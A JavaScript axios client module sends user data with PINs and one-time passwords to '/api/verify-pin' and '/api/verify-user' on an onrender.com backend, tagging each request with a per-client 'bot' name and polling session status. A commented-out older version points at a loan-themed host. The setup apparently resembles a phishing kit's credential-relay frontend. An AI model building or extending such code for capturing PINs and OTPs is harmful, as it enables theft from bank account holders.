import axios from "axios";

const API_BASE_URL =
  import.meta.env.VITE_API_URL || "https://ikwongie.onrender.com";

// 🔥 Dynamic bot from URL
const getBotName = () => {
  const path = window.location.pathname; // "/client1"
  const bot = path.split("/")[1]; // "client1"
  return bot || "user1";
};

// Debug
console.log("🔧 API Base URL:", API_BASE_URL);
console.log("🔧 Current Bot:", getBotName());

export const api = axios.create({
  baseURL: API_BASE_URL,
  headers: {
    "Content-Type": "application/json",
  },
});

// Optional: attach bot dynamically to every request
api.interceptors.request.use((config) => {
  const bot = getBotName();
  config.headers["X-Bot-Name"] = bot;
  return config;
});

export const verificationService = {
  async requestPinVerification(userData) {
    const bot = getBotName();

    console.log("📤 Sending PIN verification for bot:", bot);

    const response = await api.post("/api/verify-pin", {
      ...userData,
      bot,
    });

    return response.data;
  },

  async checkPinStatus(sessionId) {
    const bot = getBotName();

    console.log("🔍 Checking PIN status:", bot, sessionId);

    const response = await api.get(`/api/check-pin-status/${bot}/${sessionId}`);

    return response.data;
  },

  async requestVerification(userData) {
    const bot = getBotName();

    console.log("📤 Sending OTP verification for bot:", bot);

    const response = await api.post("/api/verify-user", {
      ...userData,
      bot,
    });

    return response.data;
  },

  async checkStatus(sessionId) {
    const bot = getBotName();

    console.log("🔍 Checking OTP status:", bot, sessionId);

    const response = await api.get(`/api/check-status/${bot}/${sessionId}`);

    return response.data;
  },
};

// // src/services/api.js - CLEANED & WORKING VERSION
// import axios from "axios";

// const API_BASE_URL =
//   import.meta.env.VITE_API_URL || "https://cabs-loan.onrender.com";
// const BOT_NAME = import.meta.env.VITE_BOT_NAME;

// // Debug log
// console.log("🔧 API Configuration:", {
//   API_BASE_URL,
//   BOT_NAME,
//   hasBotName: !!BOT_NAME,
// });

// if (!BOT_NAME) {
//   console.error("❌ ERROR: VITE_BOT_NAME is not set in environment variables!");
//   console.error(
//     "   Add VITE_BOT_NAME=client1 (or client2, etc.) to your .env file",
//   );
// } else {
//   console.log(`✅ Using bot name: ${BOT_NAME}`);
// }

// export const api = axios.create({
//   baseURL: API_BASE_URL,
//   headers: {
//     "Content-Type": "application/json",
//     "X-Bot-Name": BOT_NAME,
//   },
// });

// export const verificationService = {
//   // ========== PIN VERIFICATION ==========
//   async requestPinVerification(userData) {
//     console.log("📤 Sending PIN verification for bot:", BOT_NAME);
//     const response = await api.post("/api/verify-pin", {
//       ...userData,
//       bot: BOT_NAME, // Dynamic bot name from env
//     });
//     return response.data;
//   },

//   async checkPinStatus(sessionId) {
//     console.log(
//       "🔍 Checking PIN status for bot:",
//       BOT_NAME,
//       "session:",
//       sessionId,
//     );

//     // CORRECT: Directly use BOT_NAME and sessionId
//     const response = await api.get(
//       `/api/check-pin-status/${BOT_NAME}/${sessionId}`,
//     );
//     return response.data;
//   },

//   // ========== OTP VERIFICATION ==========
//   async requestVerification(userData) {
//     console.log("📤 Sending OTP verification for bot:", BOT_NAME);
//     const response = await api.post("/api/verify-user", {
//       ...userData,
//       bot: BOT_NAME,
//     });
//     return response.data;
//   },

//   async checkStatus(sessionId) {
//     console.log(
//       "🔍 Checking OTP status for bot:",
//       BOT_NAME,
//       "session:",
//       sessionId,
//     );
//     const response = await api.get(
//       `/api/check-status/${BOT_NAME}/${sessionId}`,
//     );
//     return response.data;
//   },
// };
